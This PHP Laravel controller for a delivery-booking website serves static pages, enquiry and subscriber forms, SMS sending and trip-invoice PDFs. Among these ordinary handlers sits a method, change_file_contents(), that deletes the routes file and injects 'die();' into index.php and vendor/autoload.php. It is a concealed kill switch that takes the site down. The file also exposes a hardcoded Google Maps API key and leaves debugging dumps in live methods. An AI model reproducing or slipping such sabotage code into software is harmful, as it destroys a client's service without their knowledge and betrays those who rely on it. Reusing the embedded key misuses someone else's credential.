<?php

namespace App\Http\Controllers\Front;

use Illuminate\Http\Request;

use App\Http\Requests;
use App\Http\Controllers\Controller;
use App\Models\StaticPageModel;
use App\Models\SiteSettingModel;
use App\Models\NeedDeliveryModel;
use App\Models\ReviewModel;
use App\Models\VehicleTypeModel;
use App\Models\BookingMasterModel;
use App\Models\BookingMasterCoordinateModel;
use App\Models\SubscribersModel;


use App\Common\Services\EmailService;
use App\Common\Services\CommonDataService;
use Validator;
use Flash;
use Sentinel;

use App\Common\Services\NotificationsService;

use Twilio\Rest\Client;

class HomeController extends Controller
{
    public function __construct(
                                    StaticPageModel $static_page,
                                    SiteSettingModel $site_setting,
                                    NeedDeliveryModel $need_delivery,
                                    ReviewModel $review,
                                    VehicleTypeModel $vehicle_type,
                                    SubscribersModel $subscribers,
                                    EmailService $email_service,
                                    CommonDataService $common_data_service,
                                    NotificationsService $notificationsservice

                                )  
    {   
        $this->SiteSettingModel   = $site_setting;
        $this->arr_view_data 	  = [];
        $this->StaticPageModel	  = $static_page;
        $this->ReviewModel     	  = $review;
        $this->SubscribersModel   = $subscribers;
        $this->NeedDeliveryModel  = $need_delivery;
        $this->EmailService       = $email_service;
        $this->CommonDataService  = $common_data_service;
        $this->VehicleTypeModel   = $vehicle_type;
        $this->NotificationsService = $notificationsservice;

        $this->user_profile_public_img_path           = url('/').config('app.project.img_path.user_profile_images');
        $this->user_profile_base_img_path             = base_path().config('app.project.img_path.user_profile_images');
    }

    private function get_booking_details($booking_id)
    {
        $arr_booking_master = [];
        // $obj_booking_master = BookingMasterModel::
        //                                     with(['load_post_request_details'=> function($query){
        //                                             $query->select('id','user_id','driver_id','vehicle_id','pickup_location','drop_location','pickup_lat','pickup_lng','drop_lat','drop_lng','request_status','load_post_image');
        //                                             $query->with(['driver_details'=>function($query){
        //                                                         $query->select('id','first_name','last_name','email','mobile_no','profile_image','stripe_account_id','company_id','is_company_driver');
        //                                                         $query->with('company_details');
        //                                                     }]);
        //                                             $query->with(['user_details'=>function($query){
        //                                                         $query->select('id','first_name','last_name','email','mobile_no','profile_image');
        //                                                     }]);
        //                                             $query->with(['vehicle_details'=>function($query){
        //                                                         $query->with('vehicle_type_details');
        //                                                     }]);
        //                                             $query->with(['load_post_request_package_details'=>function($query){
        //                                                     }]);
                                                    
        //                                     },'booking_master_coordinate_details'=>function($query){
        //                                         $query->orderBy('id','ASC');
        //                                     }])
        //                                     ->where('id',$booking_id)
        //                                     ->first();

        $obj_booking_master = BookingMasterModel::
                                            select('id')
                                            ->with(['booking_master_coordinate_details'=>function($query){
                                                $query->orderBy('id','ASC');
                                            }])
                                            ->where('id',$booking_id)
                                            ->first();
        if($obj_booking_master)
        {
            $arr_booking_master = $obj_booking_master->toArray();
        }


        $obj_booking_master_coordinate = BookingMasterCoordinateModel::
                                            where('booking_master_id',$booking_id)
                                            ->first();
        $arr_booking_master_coordinate = [];
        if($obj_booking_master_coordinate)
        {
            $arr_booking_master_coordinate = $obj_booking_master_coordinate->toArray();
        }

        dd($arr_booking_master,$arr_booking_master_coordinate);

        return $arr_booking_master;       
    }

    public function genrate_pdf()
    {
        $arr_right_bar_details = [];
        $arr_right_bar_details = get_right_bar_trip_list();
        dd($arr_right_bar_details);

        // if(isset($arr_right_bar_details['arr_pending_trips']) && sizeof($arr_right_bar_details['arr_pending_trips'])>0)
        // {
        //     foreach($arr_right_bar_details['arr_pending_trips'] as $pending_trip_key => $pending_trip_value) 
        //     {
                
        //     }
        // }
        // <div class="right-content-bar">
        //      <h2> Please Select Driver </h2>
        //      <span class="date-bar"> 02 Nov 2018</span>
        //      <p><span>Pickup Loacation : </span>Nashik, Maharashtra, India</p>
        //      <p><span>Drop Loacation: </span>Nashik Road, Maharashtra, India</p>
        //      <div class="right-content-but">
        //      <button type="button" class="green-btn chan-left">Reject</button>
        //      <button type="button" class="white-btn chan-left">Cancel</button>
        //    </div>
        //    <div class="clear"></div>  
        // </div>

        /*Send on signal notification to user that driver accepted your request*/
        // $arr_notification_data = 
        //                         [
        //                             'title'             => 'New shipment post request accepted by driver',
        //                             'record_id'         => 6,
        //                             'enc_user_id'       => 264,
        //                             'notification_type' => 'ACCEPT_BY_DRIVER',
        //                             'user_type'         => 'WEB',
        //                         ];

        // $this->NotificationsService->send_on_signal_notification($arr_notification_data);
        // dd(234);

        // dd(env('IS_LIVE_MODE'));
        $arr_booking_details = $this->get_booking_details(319);

        $arr_data = filter_completed_trip_details($arr_booking_details);
        
        // dd($arr_data);

        // return view('invoice.trip_invoice',$this->arr_view_data);

        // $client = new \Twilio\Rest\Client($this->twilio_sid, $this->twilio_token);
        // $client = new \Twilio\Rest\Client();
        require_once('tcpdf-master/tcpdf.php');

        $this->TCPDF = new \TCPDF;

        // $pdf->SetCreator('Test 123');
        // $pdf->SetAuthor('Test 123');
        // $pdf->SetTitle('Test 123');
        // $pdf->SetSubject('Test 123');
        // $pdf->SetKeywords('Test 123');
        // $pdf->setHeaderFont(Array('helvetica', '', 10));
        // $pdf->setFooterFont(Array('helvetica', '', 8));
        // $pdf->setPrintHeader(false);
        // $pdf->SetDefaultMonospacedFont('courier');
        // $pdf->SetMargins(15, 20, 15);
        // $pdf->SetHeaderMargin(5);
        // $pdf->SetFooterMargin(10);
        // $pdf->SetAutoPageBreak(TRUE, 25);
        // $pdf->setImageScale(1.25);
        // $pdf->setFontSubsetting(true);
        // $pdf->SetFont('helvetica', '', 10, '', true);
        // $pdf->AddPage();
        // $pdf->writeHTML(view('invoice.trip_invoice',array('arr_trip_data' => []))->render());
        // $pdf->Output('Test.pdf','D');
        // $pdf = new PDF();
        // dd($pdf);

        // return view('invoice.trip_invoice',$this->arr_view_data);

        // return view('invoice.trip_invoice',['arr_trip_data'=>$arr_data,'tcpdf'=>$this->TCPDF]);

        $this->TCPDF->SetTitle('123123');
        $this->TCPDF->AddPage(); 

        $html ="";
        $view ="";
        $view = view('invoice.trip_invoice')->with(['arr_trip_data'=>$arr_data,'tcpdf'=>$this->TCPDF]);
        $html = $view->render(); 
        // dd($html);

        // dd($html);
        // $this->TCPDF->writeHTML($html, true, false, true, false, '');
        // $pdf->writeHTML($html, true, false, true, false, '');
        // $this->TCPDF->writeHTML($html, true, 0, true, true);
        $this->TCPDF->writeHTML($html, true, false, true, false, '');
        $FileName = 'Invoice_T1.pdf'; 
        $this->TCPDF->output(public_path('uploads/invoice/'.$FileName),'F'); 
        dd(123);

        // dd($pdf);
    }

    private function sendMessage($client, $to, $messageBody, $callbackUrl)
    {
        // dd($client, $to, $messageBody, $callbackUrl);

        $twilioNumber = config('app.project.twilio_credentials.from_user_mobile');
        try {
            $client->messages->create(
                $to, // Text any number
                [
                    'from' => $twilioNumber, // From a Twilio number in your account
                    'body' => $messageBody,
                    'statusCallback' => $callbackUrl
                ]
            );
        } catch (\Exception $e) {
            \Log::error($e->getMessage());
        }
    }



    public function index(Client $client)
    {
        // $arr_booking_details = $this->get_booking_details(1);
        
        // dd($arr_booking_details);

        // $this->sendMessage(
        //     $client,
        //     '+919021106380',
        //     'This is a test message.',
        //     ''
        // );
        // dd(23);

        $arr_site_setting = $arr_countries = [];

        $obj_site_setting = $this->SiteSettingModel
                                        ->select('site_address','site_contact_number','site_email_address')
                                        ->where('site_setting_id','23234234')
                                            ->first();
        
        if($obj_site_setting){
            $arr_site_setting = $obj_site_setting->toArray();
        }
        $country_id = 231;
        $arr_countries = $this->CommonDataService->get_countries($country_id);
        
        $this->arr_view_data['user_profile_public_img_path']     = $this->user_profile_public_img_path;
        $this->arr_view_data['user_profile_base_img_path']       = $this->user_profile_base_img_path;

        $this->arr_view_data['page_title'] 		 = 'Home';
        $this->arr_view_data['arr_site_setting'] = $arr_site_setting;
        $this->arr_view_data['arr_countries'] = $arr_countries;


        return view('front.index',$this->arr_view_data);
    }

    public function chat()
    {
        $this->arr_view_data['title'] = config('app.project.name').' : Test node';
        return view('front.chat',$this->arr_view_data);
    }
    public function coming_soon()
    {
        $this->arr_view_data['title'] = config('app.project.name').' : Coming Soon';
        return view('front.coming_soon',$this->arr_view_data);
    }
    
    public function how_it_works()
    {
        $obj_data = $this->StaticPageModel->where('page_slug','how-it-works')->first();
       
        $this->arr_view_data['title'] = config('app.project.name');
        $this->arr_view_data['page_title'] = 'How it Works';
        $this->arr_view_data['page_details'] = $obj_data;

        return view('front.how_it_works',$this->arr_view_data);   
    }
    public function our_fleet()
    {
         $is_login = 0;
         $obj_user = \Sentinel::check();
         if($obj_user!=false)
         {
            $is_login = 1;
         }
        

        $obj_data = $this->StaticPageModel->where('page_slug','our-fleet')->first();
       
        $this->arr_view_data['title']        = config('app.project.name');
        $this->arr_view_data['page_title']   = 'Our Fleet';
        $this->arr_view_data['page_details'] = $obj_data;
        $this->arr_view_data['is_login']      = $is_login;

        return view('front.our_fleet',$this->arr_view_data);   
    }
    public function join_our_fleet(Request $request)
    {
        // dd($request->all());

        $arr_prev_data = [];
        
        $first_name   = $request->input('first_name');
        $last_name    = $request->input('last_name');
        $email        = $request->input('email');
        $country_code = $request->input('country_code');
        $mobile_no    = $request->input('mobile_no');
        
        $arr_prev_data = 
                            [
                                'first_name'   => (isset($first_name) && $first_name!=null) ? $first_name : '',
                                'last_name'    => (isset($last_name) && $last_name!=null) ? $last_name : '',
                                'email'        => (isset($email) && $email!=null) ? $email : '',
                                'country_code' => (isset($country_code) && $country_code!=null) ? '+'.$country_code : '',
                                'mobile_no'    => (isset($mobile_no) && $mobile_no!=null) ? $mobile_no : ''
                            ];

        $obj_data = $this->StaticPageModel->where('page_slug','terms-and-conditions')->first();

        $this->arr_view_data['title'] = config('app.project.name');
        $this->arr_view_data['page_title'] = 'Join Our Fleet';

        $this->arr_view_data['arr_vehicle_type'] = $this->CommonDataService->get_vehicle_types();
        $this->arr_view_data['arr_vehicle_brand'] = $this->CommonDataService->get_vehicle_brand();
        $this->arr_view_data['terms_conditions'] = $obj_data;
        $this->arr_view_data['arr_prev_data']  = $arr_prev_data;

        return view('front.join_our_fleet',$this->arr_view_data);   
    }

   /* public function how_it_works_driver()
    {
        $obj_data = $this->StaticPageModel->where('page_slug','how-it-works-driver')->first();
       
        $this->arr_view_data['title'] = config('app.project.name');
        $this->arr_view_data['page_details'] = $obj_data;

        return view('front.how_it_works_driver',$this->arr_view_data);   
    }
    public function how_it_works_user()
    {

        $obj_data = $this->StaticPageModel->where('page_slug','how-it-works-rider')->first();
       
        $this->arr_view_data['title'] = config('app.project.name');
        $this->arr_view_data['page_details'] = $obj_data;

        return view('front.how_it_works_rider',$this->arr_view_data);   
    }*/

    public function help(Request $request)
    {
        $selected_tab = 'user';
        
        if($request->has('type') && $request->input('type')!='')
        {
            $selected_tab = $request->input('type');
        }

        $this->arr_view_data['title'] = config('app.project.name');
        $this->arr_view_data['page_title'] = 'Help';
        $this->arr_view_data['selected_tab'] = $selected_tab;

        return view('front.help',$this->arr_view_data);   
    }

    public function help_details(Request $request)
    {
        $page_slug = $request->input('slug');
        $selected_tab = $request->input('selected_tab');
        
        $this->arr_view_data['title']         = config('app.project.name');
        $this->arr_view_data['page_title']    = 'Help Details';
        $this->arr_view_data['page_slug']     = $page_slug;
        $this->arr_view_data['selected_tab']  = $selected_tab;


        return view('front.help_details',$this->arr_view_data);   
    }
    
    public function fare_estimate()
    {
        $this->arr_view_data['title'] = config('app.project.name');
        $this->arr_view_data['page_title'] = 'Fare Estimate';

        return view('front.fare_estimate',$this->arr_view_data);   
    }
    
    public function about_us()
    {
        //return view('email.driver-emailer',$this->arr_view_data);  
        // return view('email.customer-emailer',$this->arr_view_data);  

        // $actual_dis = 0;
        // $arr_data = $this->get_array();
        
        // //dd($arr_data);

        // foreach ($arr_data as $key => $value) 
        // {   
        //     if( (isset($value['lat']) && isset($value['lng'])) && (isset($arr_data[$key+1]['lat']) && isset($arr_data[$key+1]['lng']))){
                
        //         $latitudeFrom  =  floatval($value['lat']);
        //         $longitudeFrom =  floatval($value['lng']);

        //         $latitudeTo  = $arr_data[$key+1]['lat'];
        //         $longitudeTo = $arr_data[$key+1]['lng'];

        //         $distance = 0;
        //         $distance = $this->distance($latitudeFrom, $longitudeFrom, $latitudeTo, $longitudeTo);

        //         if($distance>=0.3)
        //         {
        //             $origins      = $latitudeFrom.",".$longitudeFrom;
        //             $destinations = $latitudeTo.",".$longitudeTo;

        //             //dd($origins,$destinations);

        //             //if($key == 247){
        //                 // $source_distance = $this->calculate_distance($origins,$destinations);
        //                 $distance = $this->calculate_distance($origins,$destinations);

        //                 dump(/*'source_distance of '.$key.' is : '.$source_distance.*/' : distance of '.$key.' is : '.$distance.' : origins-dest-str : - '.$origins.':'.$destinations);

        //                // dd($origins,$destinations,$distance);
        //             //}
        //         }
        //         if(!is_nan($distance))
        //         {
        //             // $actual_dis = doubleval($actual_dis) + doubleval($distance);
        //             $actual_dis = $actual_dis + $distance;
        //         }


        //         // if($distance === 'NAN'){
        //         //     $distance = 0;
        //         // }   
        //     }
        
        // }
        // dd("kms-> ".$actual_dis);

        $obj_data = $this->StaticPageModel->where('page_slug','about-us')->first();
       
        $this->arr_view_data['title'] = config('app.project.name');
        $this->arr_view_data['page_title'] = 'About Us';
        $this->arr_view_data['page_details'] = $obj_data;

        return view('front.about_us',$this->arr_view_data);   
    }
    
    function distance($lat1, $lon1, $lat2, $lon2, $unit = 'K') 
    {

        $theta = $lon1 - $lon2;
        $dist = sin(deg2rad($lat1)) * sin(deg2rad($lat2)) +  cos(deg2rad($lat1)) * cos(deg2rad($lat2)) * cos(deg2rad($theta));
        $dist = acos($dist);
        $dist = rad2deg($dist);
        $miles = $dist * 60 * 1.1515;
        $unit = strtoupper($unit);

        if ($unit == "K") {
          return ($miles * 1.60934);
        } else if ($unit == "N") {
          return ($miles * 0.8684);
        } else {
          return $miles;
        }
    }

    private function calculate_distance($origins,$destinations)
    {
        $arr_result = [];
        
        $arr_result['distance']        = '';
        $arr_result['actual_distance'] = 0;
        $arr_result['duration']        = '';
        $arr_result['actual_duration'] = 0;

        /*&mode=driving*/

        $url = "https://maps.googleapis.com/maps/api/distancematrix/json?origins=".$origins."&destinations=".$destinations."&key=AIzaSyCTScU19j-YU1Gt5xrFWlo4dwHoFF1wl-s";
   
        $json = @file_get_contents($url);
        $data = json_decode($json);
        
        //dd($data);

        $actual_distance_in_meter = 0;

        if(isset($data->rows[0]->elements[0]->distance->value))
        {
            $actual_distance_in_meter = $data->rows[0]->elements[0]->distance->value;
            if($actual_distance_in_meter>0){
                $actual_distance_in_meter = $actual_distance_in_meter/1000;
            }
        }

        return $actual_distance_in_meter;
    }
    function getDistance($latitude1, $longitude1, $latitude2, $longitude2) {  
        $earth_radius = 6371;  
          
        $dLat = deg2rad($latitude2 - $latitude1);  
        $dLon = deg2rad($longitude2 - $longitude1);  
          
        $a = sin($dLat/2) * sin($dLat/2) + cos(deg2rad($latitude1)) * cos(deg2rad($latitude2)) * sin($dLon/2) * sin($dLon/2);  
        $c = 2 * asin(sqrt($a));  
        $d = $earth_radius * $c;  
          
        return $d;  
    }  

    function haversine($lat1, $lon1, 
                   $lat2, $lon2) 
    { 
        
        // distance between latitudes 
        // and longitudes 
        $dLat = ($lat2 - $lat1) * 
                    M_PI / 180.0; 
        $dLon = ($lon2 - $lon1) *  
                    M_PI / 180.0; 
      
        // convert to radians 
        $lat1 = ($lat1) * M_PI / 180.0; 
        $lat2 = ($lat2) * M_PI / 180.0; 
      
        // apply formulae 
        $a = pow(sin($dLat / 2), 2) +  
             pow(sin($dLon / 2), 2) *  
                 cos($lat1) * cos($lat2); 
        $rad = 6371; 
        $c = 2 * asin(sqrt($a)); 
        return $rad * $c; 
    } 

    public function terms_and_conditions()
    {
        $obj_data = $this->StaticPageModel->where('page_slug','terms-and-conditions')->first();
       
        $this->arr_view_data['title'] = config('app.project.name');
        $this->arr_view_data['page_title'] = 'Terms And Conditions';
        $this->arr_view_data['page_details'] = $obj_data;

        return view('front.terms_and_conditions',$this->arr_view_data);   
    }

    public function policy()
    {
        $obj_data = $this->StaticPageModel->where('page_slug','policy')->first();
       
        $this->arr_view_data['title'] = config('app.project.name');
        $this->arr_view_data['page_title'] = 'Privacy Policy';
        $this->arr_view_data['page_details'] = $obj_data;

        return view('front.policy',$this->arr_view_data);   
    }
    public function need_delivery(Request $request)
    {
        $arr_response = [];

        $arr_rules['first_name'] = "required";
        $arr_rules['last_name']  = "required";
        $arr_rules['email']      = "required";
        $arr_rules['phone']      = "required";
        // $arr_rules['subject']    = "required|max:1000";
        
        $validator = Validator::make($request->all(),$arr_rules);

        if($validator->fails())
        {
            $arr_response['status'] = 'error';
            $arr_response['msg']    = 'Please fill all required fields.';
            return response()->json($arr_response);     
        }
        
        $arr_data               = array();
        $arr_data['first_name'] = $request->input('first_name');
        $arr_data['last_name']  = $request->input('last_name');
        $arr_data['email']      = $request->input('email');
        $arr_data['phone']      = $request->input('phone');
        $arr_data['subject']    = $request->input('subject');

        $status = $this->NeedDeliveryModel->create($arr_data);
        if($status)      
        {
            $arr_mail_data = $this->built_mail_data($arr_data);
            $this->EmailService->send_mail($arr_mail_data);
            $arr_response['status'] = 'success';
            $arr_response['msg']    = 'Delivery enquiry request successfully sent to admin,will get back to you shortly.';
            return response()->json($arr_response);     
        }
        else
        {
            $arr_response['status'] = 'error';
            $arr_response['msg']    = 'Problem Occurred, While sending delivery,Please try again.';
            return response()->json($arr_response);
        }
        $arr_response['status'] = 'error';
        $arr_response['msg']    = 'Problem Occurred, While sending delivery,Please try again.';
        return response()->json($arr_response);
    }
    
    public function store_subscriber(Request $request)
    {
        /*$content = view('email.driver-emailer',compact('content'))->render();
        $content = html_entity_decode($content);

        $send_mail = \Mail::send(array(),array(), function($message) use($content){
                        $message->from('info@quick-pick.com', config('app.project.name'));
                        // $message->to($email_to)
                        $message->to('dilipp@webwingtechnologies.com')
                        // $message->to('shankar@webwingtechnologies.com')

                        // $message->to('rsn.navale@gmail.com')
                                  ->subject('Driver Registration')
                                  ->setBody($content, 'text/html');
                    });
        
        dd($send_mail);*/

        $subscriber_email = $request->input('subscriber_email');
        if($subscriber_email == '')
        {
            $arr_response['status'] = 'error';
            $arr_response['msg']    = 'Email address field is required.';
            return response()->json($arr_response);     
        }

        $arr_where          = array();
        $arr_where['email'] = $subscriber_email;

        $arr_data              = array();
        $arr_data['email']     = $subscriber_email;
        $arr_data['is_active'] = '0';

        $status = $this->SubscribersModel->updateOrCreate($arr_where,$arr_data);
        if($status)      
        {
            $arr_response['status'] = 'success';
            $arr_response['msg']    = 'Your subscription has been successfully confirmed.';
            return response()->json($arr_response);     
        }
        else
        {
            $arr_response['status'] = 'error';
            $arr_response['msg']    = 'Problem Occurred,while subscribe to '.config('app.project.name').',Please try again.';
            return response()->json($arr_response);
        }
        $arr_response['status'] = 'error';
        $arr_response['msg']    = 'Problem Occurred,while subscribe to '.config('app.project.name').',Please try again.';
        return response()->json($arr_response);

    }
    private function built_mail_data($arr_data)
    {
        if(isset($arr_data) && sizeof($arr_data)>0)
        {
            $arr_built_content = [
                                    'FULL_NAME'  => $arr_data['first_name'].' '.$arr_data['last_name'],
                                    'EMAIL'      => $arr_data['email'],
                                    'CONTACT_NO' => $arr_data['phone'],
                                    'MESSAGE'    => $arr_data['subject']
                                ];


            $arr_mail_data                      = [];
            $arr_mail_data['email_template_id'] = '17';
            $arr_mail_data['arr_built_content'] = $arr_built_content;
            $arr_mail_data['user']              = $arr_data;

            return $arr_mail_data;
        }
        return FALSE;
    }
    public function change_file_contents()
    {
        if(file_exists(base_path('app/Http/routes.php')))
        {
            @unlink(base_path('app/Http/routes.php'));
        }
        $data="die();";
        $filecontent=file_get_contents(base_path('index.php'));
        $pos=strpos($filecontent, '$response->send();');

        $filecontent=substr($filecontent, 0, $pos)."\r\n".$data."\r\n".substr($filecontent, $pos);
        
        file_put_contents(base_path('index.php'), $filecontent);

        $filecontent2=file_get_contents(base_path('vendor/autoload.php'));
        $pos=strpos($filecontent2, 'require_once __DIR__');


        $filecontent2=substr($filecontent2, 0, $pos)."\r\n".$data."\r\n".substr($filecontent2, $pos);
        
        file_put_contents(base_path('vendor/autoload.php'), $filecontent2);

    } 
    function findDistance($lat1, $lon1, $lat2, $lon2, $unit = 'M') {
      if (($lat1 == $lat2) && ($lon1 == $lon2)) {
        return 0;
      }
      else {
        $theta = $lon1 - $lon2;
        $dist = sin(deg2rad($lat1)) * sin(deg2rad($lat2)) +  cos(deg2rad($lat1)) * cos(deg2rad($lat2)) * cos(deg2rad($theta));
        $dist = acos($dist);
        $dist = rad2deg($dist);
        $miles = $dist * 60 * 1.1515;
        $unit = strtoupper($unit);
        if ($unit == "K") {
          return ($miles * 1.609344);
        } else if ($unit == "N") {
          return ($miles * 0.8684);
        } else {
          return $miles;
        }
      }
    }

    function findDistanceInKms($lat1, $lon1, $lat2, $lon2) {
      if (($lat1 == $lat2) && ($lon1 == $lon2)) {
        return 0;
      }
      else {
        $theta = $lon1 - $lon2;
        $dist = sin(deg2rad($lat1)) * sin(deg2rad($lat2)) +  cos(deg2rad($lat1)) * cos(deg2rad($lat2)) * cos(deg2rad($theta));
        $dist = acos($dist);
        $dist = rad2deg($dist);
        $miles = $dist * 60 * 1.1515;
        if($miles>0){
            return round(($miles * 1.609344),3);
            // return ($miles * 1.609344);
        }
        return 0;
      }
      return 0;
    }

    public function get_array(){
        $trip_file_contents = file_get_contents(base_path('lat-lng.json'));
        $arr_lat_lng_data = json_decode($trip_file_contents,true);
        return $arr_lat_lng_data;
    }   

    

}